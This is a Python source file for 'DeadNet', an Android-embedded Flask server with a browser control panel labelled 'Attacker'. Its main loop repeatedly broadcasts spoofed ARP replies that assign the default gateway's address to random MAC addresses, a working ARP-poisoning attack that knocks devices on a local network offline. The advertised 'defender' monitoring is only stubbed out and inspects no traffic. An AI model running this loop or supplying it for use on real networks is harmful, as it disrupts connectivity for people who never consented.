"""
DeadNet Server for Android
Embedded Flask server with attack/defense capabilities
"""

import os
import sys
import threading
import time
import logging

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('DeadNet')

# Flask app
from flask import Flask, jsonify, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# State
attack_state = {
    'active': False,
    'mode': None,
    'interface': None,
    'attacks_enabled': {'arp_poison': True, 'ipv6_ra': True, 'dead_router': True},
    'statistics': {'cycles': 0, 'packets_sent': 0, 'start_time': None, 'last_cycle_duration': 0},
    'network_info': {},
    'logs': []
}
attack_lock = threading.Lock()
current_attacker = None

monitor_state = {
    'active': False,
    'interface': None,
    'start_time': None,
    'statistics': {
        'total_packets': 0, 'suspicious_packets': 0, 'flagged_ips': 0,
        'flagged_macs': 0, 'arp_packets': 0, 'ipv6_packets': 0,
        'suspicious_arp': 0, 'suspicious_ipv6': 0
    },
    'recent_alerts': []
}
monitor_lock = threading.Lock()

server_thread = None
server_running = False

# Import scapy (may fail on some devices)
try:
    from scapy.all import *
    conf.verb = 0
    SCAPY_AVAILABLE = True
except Exception as e:
    logger.warning(f"Scapy not available: {e}")
    SCAPY_AVAILABLE = False


def get_network_interfaces():
    """Get available network interfaces"""
    interfaces = []
    try:
        import netifaces
        for iface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                ip = addrs[netifaces.AF_INET][0].get('addr')
                if ip and ip != '127.0.0.1':
                    interfaces.append({
                        'name': iface,
                        'ip': ip,
                        'type': 'wifi' if 'wlan' in iface.lower() else 'ethernet'
                    })
    except Exception as e:
        logger.error(f"Error getting interfaces: {e}")
    return interfaces


# Routes
@app.route('/')
def index():
    return get_html()

@app.route('/api/status')
def get_status():
    with attack_lock:
        return jsonify({
            'active': attack_state['active'],
            'mode': attack_state['mode'],
            'interface': attack_state['interface'],
            'attacks_enabled': attack_state['attacks_enabled'].copy(),
            'statistics': attack_state['statistics'].copy(),
            'network_info': attack_state['network_info'].copy()
        })

@app.route('/api/logs')
def get_logs():
    limit = request.args.get('limit', 50, type=int)
    with attack_lock:
        return jsonify({'logs': attack_state['logs'][-limit:]})

@app.route('/api/interfaces')
def get_interfaces():
    return jsonify({'interfaces': get_network_interfaces()})

@app.route('/api/start', methods=['POST'])
def start_attack():
    global current_attacker
    
    if not SCAPY_AVAILABLE:
        return jsonify({'success': False, 'error': 'Scapy not available'}), 400
    
    data = request.json
    iface = data.get('interface')
    
    if not iface:
        return jsonify({'success': False, 'error': 'Interface required'}), 400
    
    with attack_lock:
        if attack_state['active']:
            return jsonify({'success': False, 'error': 'Attack already running'}), 400
        attack_state['active'] = True
        attack_state['mode'] = data.get('mode', 'local')
        attack_state['interface'] = iface
        attack_state['statistics'] = {'cycles': 0, 'packets_sent': 0, 'start_time': time.time(), 'last_cycle_duration': 0}
        attack_state['logs'] = []
    
    def run_attack():
        global current_attacker
        try:
            add_log("[+] Attack started")
            interval = data.get('interval', 5)
            
            while attack_state['active']:
                cycle_start = time.time() * 1000
                packets = 0
                
                # Simple ARP poison
                try:
                    # Get gateway
                    import netifaces
                    gws = netifaces.gateways()
                    if 'default' in gws and netifaces.AF_INET in gws['default']:
                        gateway = gws['default'][netifaces.AF_INET][0]
                        
                        # Send ARP
                        arp = ARP(op=2, psrc=gateway, hwsrc=RandMAC(), pdst=gateway)
                        sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/arp, iface=iface, verbose=0)
                        packets += 1
                except Exception as e:
                    add_log(f"[!] Error: {e}")
                
                cycle_duration = int(time.time() * 1000 - cycle_start)
                
                with attack_lock:
                    attack_state['statistics']['cycles'] += 1
                    attack_state['statistics']['packets_sent'] += packets
                    attack_state['statistics']['last_cycle_duration'] = cycle_duration
                
                add_log(f"[+] Cycle #{attack_state['statistics']['cycles']} - {packets} packets - {cycle_duration}ms")
                time.sleep(interval)
                
        except Exception as e:
            add_log(f"[!] Error: {e}")
        finally:
            with attack_lock:
                attack_state['active'] = False
            add_log("[-] Attack stopped")
    
    threading.Thread(target=run_attack, daemon=True).start()
    return jsonify({'success': True, 'message': 'Attack started'})

@app.route('/api/stop', methods=['POST'])
def stop_attack():
    with attack_lock:
        if not attack_state['active']:
            return jsonify({'success': False, 'error': 'No attack running'}), 400
        attack_state['active'] = False
    return jsonify({'success': True, 'message': 'Attack stopped'})

@app.route('/api/defender/status')
def get_defender_status():
    with monitor_lock:
        return jsonify({
            'active': monitor_state['active'],
            'interface': monitor_state['interface'],
            'start_time': monitor_state['start_time'],
            'statistics': monitor_state['statistics'].copy(),
            'uptime': int(time.time() - monitor_state['start_time']) if monitor_state['start_time'] else 0
        })

@app.route('/api/defender/alerts')
def get_alerts():
    with monitor_lock:
        return jsonify({'alerts': monitor_state['recent_alerts'][:50]})

@app.route('/api/defender/flagged')
def get_flagged():
    return jsonify({'ips': {}, 'macs': {}})

@app.route('/api/defender/start', methods=['POST'])
def start_defender():
    data = request.json
    iface = data.get('interface')
    if not iface:
        return jsonify({'success': False, 'error': 'Interface required'}), 400
    
    with monitor_lock:
        if monitor_state['active']:
            return jsonify({'success': False, 'error': 'Already monitoring'}), 400
        monitor_state['active'] = True
        monitor_state['interface'] = iface
        monitor_state['start_time'] = time.time()
    
    return jsonify({'success': True, 'message': 'Monitoring started'})

@app.route('/api/defender/stop', methods=['POST'])
def stop_defender():
    with monitor_lock:
        monitor_state['active'] = False
    return jsonify({'success': True, 'message': 'Monitoring stopped'})

@app.route('/api/defender/clear_flags', methods=['POST'])
def clear_flags():
    return jsonify({'success': True})

@app.route('/api/shutdown', methods=['POST'])
def shutdown():
    global server_running
    with attack_lock:
        attack_state['active'] = False
    with monitor_lock:
        monitor_state['active'] = False
    server_running = False
    return jsonify({'success': True})


def add_log(message):
    with attack_lock:
        attack_state['logs'].append({
            'timestamp': time.time(),
            'message': message
        })
        if len(attack_state['logs']) > 100:
            attack_state['logs'] = attack_state['logs'][-100:]


def get_html():
    """Return embedded HTML UI"""
    return '''<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DeadNet</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { background: #0a0a0a; color: #e5e5e5; font-family: monospace; padding: 10px; }
.card { background: #111; border: 1px solid #222; border-radius: 8px; padding: 12px; margin-bottom: 10px; }
.title { color: #00ff00; font-size: 14px; margin-bottom: 10px; }
.stat { display: inline-block; text-align: center; padding: 8px; margin: 4px; background: #0a0a0a; border-radius: 4px; min-width: 70px; }
.stat-value { color: #00ff00; font-size: 18px; font-weight: bold; }
.stat-label { font-size: 10px; opacity: 0.5; }
select, button { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #333; border-radius: 4px; background: #1a1a1a; color: #fff; }
button { cursor: pointer; font-weight: bold; }
.btn-danger { background: #dc2626; }
.btn-success { background: #16a34a; }
.logs { height: 150px; overflow-y: auto; background: #0a0a0a; padding: 8px; font-size: 11px; border-radius: 4px; }
.log { padding: 2px 0; border-bottom: 1px solid #1a1a1a; }
.status { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 5px; }
.status-active { background: #00ff00; }
.status-inactive { background: #666; }
</style>
</head><body>
<div class="card">
<div class="title">⚔️ DeadNet - Attacker</div>
<div><span class="status" id="status"></span><span id="statusText">Inactive</span></div>
<div style="margin: 10px 0;">
<span class="stat"><span class="stat-value" id="cycles">0</span><br><span class="stat-label">Cycles</span></span>
<span class="stat"><span class="stat-value" id="packets">0</span><br><span class="stat-label">Packets</span></span>
<span class="stat"><span class="stat-value" id="duration">0</span><br><span class="stat-label">ms</span></span>
</div>
<select id="iface"></select>
<button id="attackBtn" class="btn-danger" onclick="toggleAttack()">START ATTACK</button>
</div>
<div class="card">
<div class="title">📋 Logs</div>
<div class="logs" id="logs"></div>
</div>
<script>
let active = false;
async function loadInterfaces() {
    const res = await fetch('/api/interfaces');
    const data = await res.json();
    const sel = document.getElementById('iface');
    sel.innerHTML = data.interfaces.map(i => '<option value="'+i.name+'">'+i.name+' ('+i.ip+')</option>').join('');
}
async function toggleAttack() {
    if (active) {
        await fetch('/api/stop', {method: 'POST'});
    } else {
        await fetch('/api/start', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({interface: document.getElementById('iface').value, interval: 2})
        });
    }
}
async function poll() {
    try {
        const res = await fetch('/api/status');
        const s = await res.json();
        active = s.active;
        document.getElementById('status').className = 'status ' + (active ? 'status-active' : 'status-inactive');
        document.getElementById('statusText').textContent = active ? 'Active' : 'Inactive';
        document.getElementById('cycles').textContent = s.statistics.cycles;
        document.getElementById('packets').textContent = s.statistics.packets_sent;
        document.getElementById('duration').textContent = s.statistics.last_cycle_duration;
        document.getElementById('attackBtn').textContent = active ? 'STOP ATTACK' : 'START ATTACK';
        document.getElementById('attackBtn').className = active ? 'btn-success' : 'btn-danger';
        
        const logs = await fetch('/api/logs?limit=20');
        const logData = await logs.json();
        document.getElementById('logs').innerHTML = logData.logs.map(l => '<div class="log">'+l.message+'</div>').join('');
    } catch(e) {}
}
loadInterfaces();
setInterval(poll, 1000);
poll();
</script>
</body></html>'''


def start_server(port=5000):
    """Start the Flask server"""
    global server_running
    server_running = True
    logger.info(f"Starting DeadNet server on port {port}")
    app.run(host='127.0.0.1', port=port, debug=False, threaded=True, use_reloader=False)


def stop_server():
    """Stop the server"""
    global server_running
    server_running = False
    logger.info("Server stopped")
